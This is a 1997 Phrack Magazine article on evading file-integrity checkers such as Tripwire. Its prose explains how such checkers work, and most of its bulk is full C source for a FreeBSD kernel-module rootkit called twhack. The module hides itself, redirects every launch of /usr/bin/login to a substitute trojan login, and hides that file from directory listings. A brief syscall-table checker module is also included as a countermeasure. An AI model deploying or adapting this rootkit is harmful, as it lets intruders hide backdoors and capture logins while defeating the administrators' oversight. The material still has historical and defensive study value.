<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
   <meta http-equiv="content-language" content="en" />
   <meta name="description" content="Phrack staff website." />
   <meta name="keywords" content="phrack" />
   <meta name="robots" content="follow,index,all" />

   <meta name="revisit-after" content="7 days" />
   
   <title>.:: Phrack Magazine ::.</title>
   
   <link href="../../css/style.css" rel="stylesheet" type="text/css">
</head>
<body id="top">
<div align="center" class="texto-2-bold">
[ <a href="../../index.html" title="News">News</a> ]
[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
[ <a href="../../authors.html" title="Authors">Authors</a> ]
[ <a href="../../archives/" title="Archives">Archives</a> ]
[ <a href="../../contact.html" title="Contact">Contact</a> ]

</div>

<center>
   <br>
   <br>
   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
   <br>

   <div class="texto-2">
   <div class="p-title">.:: Bypassing Integrity Checking Systems ::.</div>
   <hr width="600" />
   </div>
   
   <div style="padding-top: 4px; padding-bottom: 4px;">
<div class="around">

<div class="details"><strong>Issues</strong>: 
[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a class="current" href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
</div>
<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack51.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack51.tar.gz" title="Get current issue tar.gz">51</a> | <strong>Release date</strong> : <b>1997-09-01</b> | <strong>Editor</strong> : <b>route</b></div>

<div style="border-top: 1px solid black; border-bottom: 2px solid black">
<table class="tissue" cellpadding="0" cellspacing="0">
   <tbody>
      <tr><td align="left"><a href="../../issues/51/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
<tr><td align="left"><a href="../../issues/51/2.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr>
<tr><td align="left"><a href="../../issues/51/3.html#article">Line Noise</a></td><td align="right">various</td></tr>
<tr><td align="left"><a href="../../issues/51/4.html#article">Phrack Prophile on Swamp Ratte</a></td><td align="right">Phrack Staff</td></tr>
<tr><td align="left"><a href="../../issues/51/5.html#article">File Descriptor Hijacking</a></td><td align="right">orabidoo</td></tr>
<tr><td align="left"><a href="../../issues/51/6.html#article">LOKI2 (the implementation)</a></td><td align="right">route</td></tr>
<tr><td align="left"><a href="../../issues/51/7.html#article">Juggernaut 1.0 - 1.2 patchfile</a></td><td align="right">route</td></tr>
<tr><td align="left"><a href="../../issues/51/8.html#article">Shared Library Redirection</a></td><td align="right">halflife</td></tr>
<tr><td align="left"><a href="../../issues/51/9.html#article">Bypassing Integrity Checking Systems</a></td><td align="right">halflife</td></tr>
<tr><td align="left"><a href="../../issues/51/10.html#article">Stealth RPC scanning</a></td><td align="right">halflife</td></tr>
<tr><td align="left"><a href="../../issues/51/11.html#article">The Art of Scanning</a></td><td align="right">Fyodor</td></tr>
<tr><td align="left"><a href="../../issues/51/12.html#article">The Eternity Service</a></td><td align="right">Adam Back</td></tr>
<tr><td align="left"><a href="../../issues/51/13.html#article">Monoalphabetic cipher cryptanalysis</a></td><td align="right">mythrandir</td></tr>
<tr><td align="left"><a href="../../issues/51/14.html#article">Phrack Magazine Article Index Guide</a></td><td align="right">guyver</td></tr>
<tr><td align="left"><a href="../../issues/51/15.html#article">A Brief introduction to CCS7</a></td><td align="right">Narbo</td></tr>
<tr><td align="left"><a href="../../issues/51/16.html#article">Phrack World News</a></td><td align="right">disorder</td></tr>
<tr><td align="left"><a href="../../issues/51/17.html#article">extract.c</a></td><td align="right">Phrack Staff</td></tr>

   </tbody>
</table>

<div class="opt" id="article"><strong>Title</strong> : Bypassing Integrity Checking Systems</div>
<div class="opt-bottom"> <strong>Author</strong> : halflife</div>
<pre>---[  Phrack Magazine   Volume 7, Issue 51 September 01, 1997, article 09 of 17


-------------------------[  Bypassing Integrity Checking Systems


--------[  halflife &lt;halflife@infonexus.com&gt;


In this day and age where intrusions happen on a daily basis and there is a
version of &quot;rootkit&quot; for every operating system imaginable, even mostly
incompetent system administration staff have begun doing checksums on their
binaries.  For the hacker community, this is a major problem since their very 
clever trojan programs are quickly detected and removed.  Tripwire is a very 
popular and free utility to do integrity checking on UNIX systems.  This 
article explores a simple method for bypassing checks done by tripwire and 
other integrity checking programs.

First off, how do integrity-checking programs work?  Well, when you first
install them, they calculate a hash (sometimes multiple hashes) of all the
binary files you wish to monitor.  Then, periodically, you run the checker
and it compares the current hash with the previously recorded hash.  If the
two differ, than something funny is going on, and it is noted.  Several 
different algorithms exist for doing the hashes, the most popular probably 
being the MD5 hash.

In the past, there have been problems with several hashes.  MD5 has had some
collisions, as have many other secure hash algorithms. However, exploiting the 
collisions is still very very difficult.  The code in this article does not 
rely on the use of a specific algorithm, rather we focus on a problem of trust 
-- integrity checking programs need to trust the operating system, and some 
may even trust libc.  In code that is designed to detect compromises that 
would by their very nature require root access, you can not trust anything, 
including your own operating system.

The design of twhack had several requirements.  The first is that it need not
require a kernel rebuild; loadable kernel modules (lkm) provided a solution
to this.  The second is that it need be relatively stealthy.  I managed to find
a simple way to hide the lkm in the FreeBSD kernel (probably works in OpenBSD
and NetBSD although I have not verified this).  Once you load the module, the
first ls type command will effectively hide the module from view.  Once hidden
it can not be unloaded or seen with the modunload(8) command.

First, a little information on FreeBSD loadable modules.  I am using the MISC 
style of modules, which is basically similar to linux modules.  It gives you 
pretty much full access to everything.  LKM info is stored in an array of 
structures.  In FreeBSD 2.2.1 the array has room for 20 modules.

Hiding the modules is really quite simple.  There is a used variable that 
determines if the module slot is free or not.  When you insert a module, the 
device driver looks for the first free module entry -- free being defined as 
an entry with 0 in the used slot and places some info in the structure.  The 
info is mainly used for unloading, and we are not interested in that, so it is 
okay if other modules overwrite our structure (some might call that a feature, 
even).

Next we have to redirect the system calls we are interested in.  This is
somewhat similar to Linux modules as well.  System calls are stored in an 
array of structures.  The structure contains a pointer to the system call and 
a variable specifying the number of arguments.  Obviously, all we are 
interested in is the pointer.  First we bcopy the structure to a variable, 
then we modify the function pointer to point to our code.  In our code we can 
do stuff like old_function.sy_call(arguments) to call the original system call 
-- quick and painless.

Now that we know HOW to redirect system calls, which ones do we redirect in 
order to bypass integrity checkers?  Well, there are a number of possibilities.
You could redirect open(), stat(), and a bunch of others so that reads of your 
modified program redirect to copies of the unmodified version.  I, however, 
chose the opposite approach.  Execution attempts of login redirect to another 
program, opens still go to the real login program.  Since we don't want our 
alternative login program being detected, I also modified getdirentries so 
that our program is never in the buffer it returns.  Similar things probably 
should have been done with syscall 156 which is old getdirentries, but I don't 
think it is defined and I don't know of anything using it, so it probably does 
not really matter.

Despite the attempts at keeping hidden, there are a few ways to detect this 
code.  One of the ways of detecting (and stopping) the code is provided.
It is a simple stealthy module that logs when syscall addresses change, and
reverses the changes.  This will stop the twhack module as provided, but is
FAR from perfect.

What the checking code does is bcopy() the entire sysent array into a local
copy.  Then it registers an at_fork() handler and in the handler it checks
the current system call table against the one in memory, if they differ it
logs the differences and changes the entry back.

&lt;++&gt; twhack/Makefile
CC=gcc
LD=ld
RM=rm
CFLAGS=-O -DKERNEL -DACTUALLY_LKM_NOT_KERNEL $(RST)
LDFLAGS=-r
RST=-DRESTORE_SYSCALLS

all: twhack syscheck

twhack: 
	$(CC) $(CFLAGS) -c twhack.c
	$(LD) $(LDFLAGS) -o twhack_mod.o twhack.o
	@$(RM) twhack.o

syscheck:
	$(CC) $(CFLAGS) -c syscheck.c
	$(LD) $(LDFLAGS) -o syscheck_mod.o syscheck.o
	@$(RM) syscheck.o
clean:
	$(RM) -f *.o 
&lt;--&gt;
&lt;++&gt; twhack/twhack.c
/*
** This code is a simple example of bypassing Integrity checking
** systems in FreeBSD 2.2. It has been tested in 2.2.1, and
** believed to work (although not tested) in 3.0.
**
** Halflife &lt;halflife@infonexus.com&gt;
*/

/* change these */
#define ALT_LOGIN_PATH &quot;/tmp/foobar&quot;
#define ALT_LOGIN_BASE &quot;foobar&quot;

/* includes */
#include &lt;sys/param.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/proc.h&gt;
#include &lt;sys/systm.h&gt;
#include &lt;sys/sysproto.h&gt;
#include &lt;sys/conf.h&gt;
#include &lt;sys/mount.h&gt;
#include &lt;sys/exec.h&gt;
#include &lt;sys/sysent.h&gt;
#include &lt;sys/lkm.h&gt;
#include &lt;a.out.h&gt;
#include &lt;sys/file.h&gt;
#include &lt;sys/errno.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/dirent.h&gt;

/* storage for original execve and getdirentries syscall entries */
static struct sysent old_execve;
static struct sysent old_getdirentries;

/* prototypes for new execve and getdirentries functions */
int new_execve __P((struct proc *p, void *uap, int retval[]));
int new_getdirentries __P((struct proc *p, void *uap, int retval[]));

/* flag used for the stealth stuff */
static int hid=0;

/* table we need for the stealth stuff */
static struct lkm_table *table;

/* misc lkm */
MOD_MISC(twhack);

/*
** this code is called when we load or unload the module. unload is
** only possible if we initialize hid to 1
*/
static int
twhack_load(struct lkm_table *l, int cmd)
{
	int err = 0;
	switch(cmd)
	{
		/*
		** save execve and getdirentries system call entries
		** and point function pointers to our code
		*/
		case LKM_E_LOAD:
			if(lkmexists(l))
				return(EEXIST); 
			bcopy(&amp;sysent[SYS_execve], &amp;old_execve, sizeof(struct sysent));
			sysent[SYS_execve].sy_call = new_execve;
			bcopy(&amp;sysent[SYS_getdirentries], &amp;old_getdirentries, sizeof(struct sysent));
			sysent[SYS_getdirentries].sy_call = new_getdirentries;
			table = l;
			break;
		/* restore syscall entries to their original condition */
		case LKM_E_UNLOAD:
			bcopy(&amp;old_execve, &amp;sysent[SYS_execve], sizeof(struct sysent));
			bcopy(&amp;old_getdirentries, &amp;sysent[SYS_getdirentries], sizeof(struct sysent));
			break;
		default:
			err = EINVAL;
			break;
	}
	return(err);
}

/* entry point to the module */
int
twhack_mod(struct lkm_table *l, int cmd, int ver)
{
	DISPATCH(l, cmd, ver, twhack_load, twhack_load, lkm_nullcmd);
}

/*
** execve is simple, if they attempt to execute /usr/bin/login
** we change fname to ALT_LOGIN_PATH and then call the old execve
** system call.
*/
int
new_execve(struct proc *p, void *uap, int  *retval)
{
	struct execve_args *u=uap;

	if(!strcmp(u-&gt;fname, &quot;/usr/bin/login&quot;))
		strcpy(u-&gt;fname, ALT_LOGIN_PATH);
	return old_execve.sy_call(p, uap, retval);
}

/*
** in getdirentries() we call the original syscall first
** then nuke any occurance of ALT_LOGIN_BASE. ALT_LOGIN_PATH
** and ALT_LOGIN_BASE should _always_ be modified and made
** very obscure, perhaps with upper ascii characters.
*/
int
new_getdirentries(struct proc *p, void *uap, int *retval)
{
	struct getdirentries_args *u=uap;
	struct dirent *dep;
	int nbytes;
	int r,i;

	/* if hid is not set, set the used flag to 0 */
	if(!hid)
	{
		table-&gt;used = 0;
		hid++;
	}
	r = old_getdirentries.sy_call(p, uap, retval);
	nbytes = *retval;
	while(nbytes &gt; 0)
	{
		dep = (struct dirent *)u-&gt;buf;
		if(!strcmp(dep-&gt;d_name, ALT_LOGIN_BASE))
		{
			i = nbytes - dep-&gt;d_reclen;
			bcopy(u-&gt;buf+dep-&gt;d_reclen, u-&gt;buf, nbytes-dep-&gt;d_reclen);
			*retval = i;
			return r;
		}
		nbytes -= dep-&gt;d_reclen;
		u-&gt;buf += dep-&gt;d_reclen;
	}
	return r;
}
&lt;--&gt;
&lt;++&gt; twhack/syscheck.c
#include &lt;sys/param.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/proc.h&gt;
#include &lt;sys/systm.h&gt;
#include &lt;sys/sysproto.h&gt;
#include &lt;sys/conf.h&gt;
#include &lt;sys/mount.h&gt;
#include &lt;sys/exec.h&gt;
#include &lt;sys/sysent.h&gt;
#include &lt;sys/lkm.h&gt;
#include &lt;a.out.h&gt;
#include &lt;sys/file.h&gt;
#include &lt;sys/errno.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/dirent.h&gt;

static int hid=0;
static struct sysent table[SYS_MAXSYSCALL];
static struct lkm_table *boo;
MOD_MISC(syscheck);
void check_sysent(struct proc *, struct proc *, int);

static int
syscheck_load(struct lkm_table *l, int cmd)
{
	int err = 0;
	switch(cmd)
	{
		case LKM_E_LOAD:
			if(lkmexists(l))
				return(EEXIST); 
			bcopy(sysent, table, sizeof(struct sysent)*SYS_MAXSYSCALL);
			boo=l;
			at_fork(check_sysent);
			break;
		case LKM_E_UNLOAD:
			rm_at_fork(check_sysent);
			break;
		default:
			err = EINVAL;
			break;
	}
	return(err);
}

int
syscheck_mod(struct lkm_table *l, int cmd, int ver)
{
	DISPATCH(l, cmd, ver, syscheck_load, syscheck_load, lkm_nullcmd);
}

void
check_sysent(struct proc *parent, struct proc *child, int flags)
{
	int i;
	if(!hid)
	{
		boo-&gt;used = 0;
		hid++;
	}
	for(i=0;i &lt; SYS_MAXSYSCALL;i++)
	{
		if(sysent[i].sy_call != table[i].sy_call)
		{
			printf(&quot;system call %d has been modified (old: %p new: %p)\n&quot;, i, table[i].sy_call, sysent[i].sy_call);
#ifdef RESTORE_SYSCALLS
			sysent[i].sy_call = table[i].sy_call;
#endif
		}
	}
}
&lt;--&gt;


----[  EOF

</pre>

</div>
</div>

</center>

<div align="center" class="texto-2-bold">
[ <a href="../../index.html" title="News">News</a> ]
[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
[ <a href="../../authors.html" title="Authors">Authors</a> ]
[ <a href="../../archives/" title="Archives">Archives</a> ]
[ <a href="../../contact.html" title="Contact">Contact</a> ]
</div>

<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
</body>
</html>
